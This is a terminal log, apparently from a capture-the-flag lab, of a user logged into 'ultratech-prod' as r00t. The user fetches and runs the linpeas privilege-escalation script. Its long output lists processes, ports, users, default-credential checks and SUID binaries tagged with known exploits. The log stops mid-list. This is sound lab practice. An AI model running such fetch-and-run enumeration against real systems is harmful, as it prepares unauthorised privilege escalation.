``01-05-2025 22:28``

ssh r00t@ultra.tech.thm                                                                           ─╯
r00t@ultra.tech.thm's password:
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan  5 19:02:37 UTC 2025

  System load:  0.0                Processes:           104
  Usage of /:   24.3% of 19.56GB   Users logged in:     0
  Memory usage: 75%                IP address for eth0: 10.10.253.17
  Swap usage:   0%


1 package can be updated.
0 updates are security updates.


Last login: Sun Jan  5 19:02:23 2025 from 10.9.3.166
r00t@ultratech-prod:~$ ls
r00t@ultratech-prod:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .gnupg  .profile
r00t@ultratech-prod:~$ pwd
/home/r00t
r00t@ultratech-prod:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
r00t@ultratech-prod:~$ cd ~/.ssh
-bash: cd: /home/r00t/.ssh: No such file or directory
r00t@ultratech-prod:~$ cd /tmp
r00t@ultratech-prod:/tmp$ ls
systemd-private-c7043faae5364812b94a5a2088ada6e9-apache2.service-o0Z0zL
systemd-private-c7043faae5364812b94a5a2088ada6e9-systemd-resolved.service-T8I3u7
systemd-private-c7043faae5364812b94a5a2088ada6e9-systemd-timesyncd.service-4LPFTH
r00t@ultratech-prod:/tmp$ wget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh
--2025-01-05 19:12:22--  https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... ^C
r00t@ultratech-prod:/tmp$ nano linpeas.sh
r00t@ultratech-prod:/tmp$ ls
linpeas.sh
systemd-private-c7043faae5364812b94a5a2088ada6e9-apache2.service-o0Z0zL
systemd-private-c7043faae5364812b94a5a2088ada6e9-systemd-resolved.service-T8I3u7
systemd-private-c7043faae5364812b94a5a2088ada6e9-systemd-timesyncd.service-4LPFTH
r00t@ultratech-prod:/tmp$ chmod +x linpeas.sh
r00t@ultratech-prod:/tmp$ ./linpeas.sh

     [48;5;108m     [48;5;59m [48;5;71m [48;5;77m       [48;5;22m [48;5;108m   [48;5;114m [48;5;59m [49m
     [48;5;108m  [48;5;71m [48;5;22m [48;5;113m [48;5;71m [48;5;94m [48;5;214m  [48;5;58m [48;5;214m    [48;5;100m [48;5;71m  [48;5;16m [48;5;108m  [49m
     [48;5;65m [48;5;16m [48;5;22m [48;5;214m      [48;5;16m [48;5;214m        [48;5;65m  [49m
     [48;5;65m [48;5;214m       [48;5;16m [48;5;214m [48;5;16m [48;5;214m       [48;5;136m [48;5;65m [49m
     [48;5;23m [48;5;214m          [48;5;178m [48;5;214m       [48;5;65m [49m
     [48;5;16m [48;5;214m         [48;5;136m [48;5;94m   [48;5;136m [48;5;214m    [48;5;65m [49m
     [48;5;58m [48;5;214m  [48;5;172m [48;5;64m [48;5;77m             [48;5;71m [48;5;65m [49m
     [48;5;16m [48;5;71m [48;5;77m  [48;5;71m [48;5;77m         [48;5;71m [48;5;77m   [48;5;65m  [49m
     [48;5;59m [48;5;71m [48;5;77m [48;5;77m [48;5;16m [48;5;77m         [48;5;16m [48;5;77m   [48;5;65m  [49m
     [48;5;65m  [48;5;77m      [48;5;71m [48;5;16m [48;5;77m    [48;5;113m [48;5;77m   [48;5;65m  [49m
     [48;5;65m [48;5;16m [48;5;77m  [48;5;150m [48;5;113m [48;5;77m        [48;5;150m [48;5;113m [48;5;77m [48;5;65m [48;5;59m [48;5;65m [49m
     [48;5;16m [48;5;65m [48;5;71m [48;5;77m             [48;5;71m [48;5;22m [48;5;65m  [49m
     [48;5;108m  [48;5;107m [48;5;59m [48;5;77m           [48;5;16m [48;5;114m [48;5;108m   [49m
  linpeas v2.2.7 by carlospolop

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.15.0-46-generic (buildd@lgw01-amd64-038) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019
User & Groups: uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
Hostname: ultratech-prod
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)


====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-46-generic (buildd@lgw01-amd64-038) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.2 LTS
Release:        18.04
Codename:       bionic

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[+] Date
Sun Jan  5 19:14:06 UTC 2025

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
udev            210M     0  210M   0% /dev
tmpfs            48M  884K   48M   2% /run
/dev/xvda2       20G  4.8G   14G  26% /
tmpfs           240M     0  240M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           240M     0  240M   0% /sys/fs/cgroup
/dev/loop0       91M   91M     0 100% /snap/core/6350
/dev/loop1       92M   92M     0 100% /snap/core/6531
tmpfs            48M     0   48M   0% /run/user/1001
              total        used        free      shared  buff/cache   available
Mem:         490980      306680       21404        2420      162896      169800
Swap:             0           0           0

[+] Environment
[i] Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/r00t
USER=r00t
SSH_CLIENT=10.9.3.166 3062 22
SHLVL=1
HOME=/home/r00t
SSH_TTY=/dev/pts/0
LOGNAME=r00t
_=./linpeas.sh
XDG_SESSION_ID=195
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1001
LANG=en_US.UTF-8
HISTSIZE=0
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
SSH_CONNECTION=10.9.3.166 3062 10.10.253.17 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found

[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found
[+] Is this a container? .......... No
[+] Is ASLR enabled? .......... Yes

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
UUID=d75d4ac6-bc62-4085-bee1-e19d4513eb4e       /       ext4    defaults        0 0


====================================( Available Software )====================================
[+] Useful software?
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/gcc
/usr/bin/g++
/usr/bin/make
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[+] Installed compilers?
ii  g++                                   4:7.3.0-3ubuntu2.1                 amd64        GNU C++ compiler
ii  g++-7                                 7.3.0-27ubuntu1~18.04              amd64        GNU C++ compiler
ii  gcc                                   4:7.3.0-3ubuntu2.1                 amd64        GNU C compiler
ii  gcc-7                                 7.3.0-27ubuntu1~18.04              amd64        GNU C compiler
/usr/bin/gcc
/usr/bin/g++


================================( Processes, Cron & Services )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  1.5 225196  7552 ?        Ss   15:58   0:01 /sbin/init maybe-ubiquity
root       398  0.0  2.7 127888 13340 ?        S<s  15:58   0:00 /lib/systemd/systemd-journald
root       418  0.0  0.2  97708  1352 ?        Ss   15:58   0:00 /sbin/lvmetad -f
root       421  0.0  1.0  46772  5180 ?        Ss   15:58   0:01 /lib/systemd/systemd-udevd
systemd+   577  0.0  0.3 141924  1656 ?        Ssl  15:59   0:00 /lib/systemd/systemd-timesyncd
systemd+   643  0.0  0.7  80036  3488 ?        Ss   15:59   0:00 /lib/systemd/systemd-networkd
systemd+   667  0.0  0.7  70624  3484 ?        Ss   15:59   0:00 /lib/systemd/systemd-resolved
root       743  0.0  2.4 169088 11920 ?        Ssl  15:59   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       745  0.0  0.5  30028  2668 ?        Ss   15:59   0:00 /usr/sbin/cron -f
root       746  0.0  0.3 161076  1580 ?        Ssl  15:59   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       747  0.0  0.9  70584  4884 ?        Ss   15:59   0:00 /lib/systemd/systemd-logind
root       752  0.0  0.2  31872  1320 ?        Ss   15:59   0:00 /usr/sbin/inetd
message+   753  0.0  0.7  50060  3808 ?        Ss   15:59   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
daemon     780  0.0  0.4  28332  2036 ?        Ss   15:59   0:00 /usr/sbin/atd -f
root       782  0.0  1.0 286236  5040 ?        Ssl  15:59   0:00 /usr/lib/accountsservice/accounts-daemon
syslog     783  0.0  0.7 267272  3568 ?        Ssl  15:59   0:00 /usr/sbin/rsyslogd -n
root       791  0.0  0.4  28676  2168 ?        Ss   15:59   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       797  0.0  2.9 185908 14568 ?        Ssl  15:59   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       805  0.0  2.6 627212 12908 ?        Ssl  15:59   0:00 /usr/lib/snapd/snapd
root       809  0.0  0.3  14664  1784 ttyS0    Ss+  15:59   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       833  0.0  0.3  14888  1520 tty1     Ss+  15:59   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       858  0.0  0.9 291464  4908 ?        Ssl  15:59   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       969  0.0  1.1  72296  5696 ?        Ss   15:59   0:00 /usr/sbin/sshd -D
root       990  0.0  2.0 335320 10004 ?        Ss   15:59   0:00 /usr/sbin/apache2 -k start
www-data   995  0.0  1.6 339940  8252 ?        S    15:59   0:00 /usr/sbin/apache2 -k start
www-data   996  0.0  1.7 339948  8384 ?        S    15:59   0:00 /usr/sbin/apache2 -k start
mysql     1135  0.0 33.8 1154564 166312 ?      Sl   15:59   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root      1330  0.0  0.5  57500  2932 ?        S    16:00   0:00 /usr/sbin/CRON -f
www       1331  0.0  0.1   4628   736 ?        Ss   16:00   0:00 /bin/sh -c sh /home/www/api/start.sh
www       1333  0.0  0.1   4628   708 ?        S    16:00   0:00 sh /home/www/api/start.sh
www       1337  0.0  8.0 1167600 39520 ?       Sl   16:00   0:10 node index.js
www-data  2641  0.0  1.7 339948  8816 ?        S    16:54   0:00 /usr/sbin/apache2 -k start
www-data  2657  0.0  1.7 339948  8692 ?        S    16:54   0:00 /usr/sbin/apache2 -k start
www-data  2755  0.0  1.5 339780  7592 ?        S    16:59   0:00 /usr/sbin/apache2 -k start
www-data  2790  0.0  1.7 339780  8648 ?        S    17:01   0:00 /usr/sbin/apache2 -k start
www-data  2791  0.0  1.7 339780  8644 ?        S    17:01   0:00 /usr/sbin/apache2 -k start
www-data  2793  0.0  1.7 339780  8644 ?        S    17:01   0:00 /usr/sbin/apache2 -k start
www-data  2795  0.0  1.5 339780  7592 ?        S    17:01   0:00 /usr/sbin/apache2 -k start
www-data  2812  0.0  1.7 339956  8784 ?        S    17:02   0:00 /usr/sbin/apache2 -k start
r00t      5297  0.0  1.3  76620  6604 ?        Ss   19:02   0:00 /lib/systemd/systemd --user
r00t      5299  0.0  0.4 259180  2356 ?        S    19:02   0:00 (sd-pam)
r00t      5514  0.0  1.1 108116  5860 ?        S    19:02   0:00 sshd: r00t@pts/0
r00t      5515  0.0  1.0  21480  5312 pts/0    Ss   19:02   0:00 -bash
r00t      5822  0.0  0.3   4760  1840 pts/0    S+   19:14   0:00 /bin/sh ./linpeas.sh
r00t      6004  0.0  0.7  38372  3464 pts/0    R+   19:14   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
   0 lrwxrwxrwx 1 root root    4 Feb 14  2019 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Feb 28  2019 /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Feb 28  2019 /lib/systemd/systemd-journald
216K -rwxr-xr-x 1 root root 215K Feb 28  2019 /lib/systemd/systemd-logind
1.6M -rwxr-xr-x 1 root root 1.6M Feb 28  2019 /lib/systemd/systemd-networkd
372K -rwxr-xr-x 1 root root 371K Feb 28  2019 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K Feb 28  2019 /lib/systemd/systemd-timesyncd
572K -rwxr-xr-x 1 root root 571K Feb 28  2019 /lib/systemd/systemd-udevd
 56K -rwxr-xr-x 1 root root  56K Oct 15  2018 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Feb 28  2019 /sbin/init -> /lib/systemd/systemd
 84K -rwxr-xr-x 1 root root  83K Apr 12  2018 /sbin/lvmetad
232K -rwxr-xr-x 1 root root 232K Nov 15  2017 /usr/bin/dbus-daemon
 20K -rwxr-xr-x 1 root root  19K Nov 23  2018 /usr/bin/lxcfs
   0 lrwxrwxrwx 1 root root    9 Oct 25  2018 /usr/bin/python3 -> python3.6
180K -rwxr-xr-x 1 root root 179K Dec 18  2017 /usr/lib/accountsservice/accounts-daemon
 16K -rwxr-xr-x 1 root root  15K Jan 15  2019 /usr/lib/policykit-1/polkitd
 17M -rwxr-xr-x 1 root root  17M Mar 15  2019 /usr/lib/snapd/snapd
656K -rwxr-xr-x 1 root root 656K Oct 10  2018 /usr/sbin/apache2
 28K -rwxr-xr-x 1 root root  27K Feb 20  2018 /usr/sbin/atd
 48K -rwxr-xr-x 1 root root  47K Nov 16  2017 /usr/sbin/cron
 40K -rwxr-xr-x 1 root root  39K Nov  1  2017 /usr/sbin/inetd
 24M -rwxr-xr-x 1 root root  24M Jan 21  2019 /usr/sbin/mysqld
668K -rwxr-xr-x 1 root root 665K Apr 24  2018 /usr/sbin/rsyslogd
772K -rwxr-xr-x 1 root root 769K Mar  4  2019 /usr/sbin/sshd
168K -rwxr-xr-x 1 root root 165K Feb  5  2018 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
-rw-r--r-- 1 root root  722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Mar 19  2019 .
drwxr-xr-x 101 root root 4096 Mar 22  2019 ..
-rw-r--r--   1 root root  589 Jun 26  2018 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  191 Feb 14  2019 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x   2 root root 4096 Mar 19  2019 .
drwxr-xr-x 101 root root 4096 Mar 22  2019 ..
-rwxr-xr-x   1 root root  539 Oct 10  2018 apache2
-rwxr-xr-x   1 root root  376 Nov 20  2017 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jun 26  2018 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x   1 root root  214 Jun 27  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Feb 14  2019 .
drwxr-xr-x 101 root root 4096 Mar 22  2019 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Feb 14  2019 .
drwxr-xr-x 101 root root 4096 Mar 22  2019 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Feb 14  2019 .
drwxr-xr-x 101 root root 4096 Mar 22  2019 ..
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  211 Jun 27  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions
 [ - ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  cgroupfs-mount
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  docker
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  mysql
 [ - ]  open-iscsi
 [ - ]  open-vm-tools
 [ + ]  openbsd-inetd
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  ubuntu-fan
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ - ]  uuidd
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS
ultratech-prod
127.0.0.1       localhost.localdomain   localhost
::1             localhost6.localdomain6 localhost6

::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

[+] Content of /etc/inetd.conf










[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.253.17  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::87:73ff:feb5:ef5f  prefixlen 64  scopeid 0x20<link>
        ether 02:87:73:b5:ef:5f  txqueuelen 1000  (Ethernet)
        RX packets 102708  bytes 6323596 (6.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 103330  bytes 10347960 (10.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1350  bytes 125136 (125.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1350  bytes 125136 (125.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa DELAY
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.10.0.1       0.0.0.0         UG    100    0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0
10.10.0.1       0.0.0.0         255.255.255.255 UH    100    0        0 eth0

[+] Iptables rules
iptables rules Not Found

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0   8168 10.10.253.17:22         10.9.3.166:3062         ESTABLISHED -
tcp6       0      0 :::8081                 :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::31331                :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 10.10.253.17:68         0.0.0.0:*                           -

[+] Can I sniff with tcpdump?
No


====================================( Users Information )=====================================
[+] My user
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

[+] Do I have PGP keys?

[+] Clipboard or highlighted text?
xsel and xclip Not Found

[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

[+] Checking /etc/doas.conf
/etc/doas.conf Not Found

[+] Checking Pkexec policy

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!

[+] Superusers
root:x:0:0:root:/root:/bin/bash

[+] Users with console
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
r00t:x:1001:1001::/home/r00t:/bin/bash
root:x:0:0:root:/root:/bin/bash
www:x:1002:1002::/home/www:/bin/sh

[+] Login information
 19:14:09 up  3:15,  1 user,  load average: 0.14, 0.05, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
r00t     pts/0    10.9.3.166       19:02    5.00s  0.04s  0.00s w
reboot   system boot  4.15.0-46-generi Fri Mar 22 13:56 - 14:01  (00:04)
www      pts/0        :tty1:S.0        Fri Mar 22 13:51 - 13:51  (00:00)
www      pts/1        :pts/0:S.0       Fri Mar 22 13:49 - 13:51  (00:01)
www      pts/0        :tty1:S.0        Fri Mar 22 13:49 - 13:49  (00:00)
lp1      tty1                          Fri Mar 22 12:38 - down   (01:17)
reboot   system boot  4.15.0-46-generi Fri Mar 22 12:38 - 13:56  (01:17)
lp1      tty1                          Tue Mar 19 14:42 - down   (01:50)
reboot   system boot  4.15.0-46-generi Tue Mar 19 14:42 - 16:32  (01:50)

wtmp begins Tue Mar 19 14:42:00 2019

[+] All users
_apt
backup
bin
daemon
dnsmasq
ftp
games
gnats
irc
landscape
list
lp1
lp
lxd
mail
man
messagebus
mysql
news
nobody
pollinate
proxy
r00t
root
sshd
sync
syslog
systemd-network
systemd-resolve
sys
uucp
uuidd
www-data
www

[+] Password policy
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql  Ver 14.14 Distrib 5.7.25, for Linux (x86_64) using  EditLine wrapper

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Looking for mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
Version: Server version: Apache/2.4.29 (Ubuntu)
Server built:   2018-10-10T18:59:25

[+] Looking for PHPCookies
 Not Found

[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found

[+] Looking for Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
 Not Found

[+] Looking for supervisord configuration file
supervisord.conf Not Found

[+] Looking for cesi configuration file
cesi.conf Not Found

[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found

[+] Looking for wifi conns file
 Not Found

[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Looking for .vnc directories and their passwd files
.vnc Not Found

[+] Looking for ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found

[+] Looking for ssl/ssh files
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
  --> Some certificates were found:
/usr/lib/python3/dist-packages/twisted/internet/test/fake_CAs/chain.pem
/etc/pollinate/entropy.ubuntu.com.pem


Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No

[+] Looking for Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Looking for Kibana yaml
kibana.yml Not Found

[+] Looking for logstash files
 Not Found

[+] Looking for elasticsearch files
 Not Found

[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Looking for AD cached hahses
cached hashes Not Found

[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
No Sockets found in /run/screen/S-r00t.

[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Looking for Couchdb directory

[+] Looking for redis.conf

[+] Looking for dovecot files
dovecot credentials Not Found

[+] Looking for mosquitto.conf


====================================( Interesting Files )=====================================
[+] SUID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/traceroute6.iputils
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/pkexec         --->    rhel_6/Also_check_groups_privileges_and_pkexec_policy
/usr/bin/at
/usr/bin/sudo           --->    /sudo$
/usr/bin/gpasswd
/bin/su
/bin/mount              --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/ping
/bin/ntfs-3g            --->    Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others
/bin/fusermount
/bin/umount             --->    BSD/Linux[1996-08-13]
/snap/core/6350/bin/mount               --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount              --->    BSD/Linux[1996-08-13]
/snap/core/6350/usr/bin/chfn            --->    SuSE_9.3/10
/snap/core/6350/usr/bin/chsh
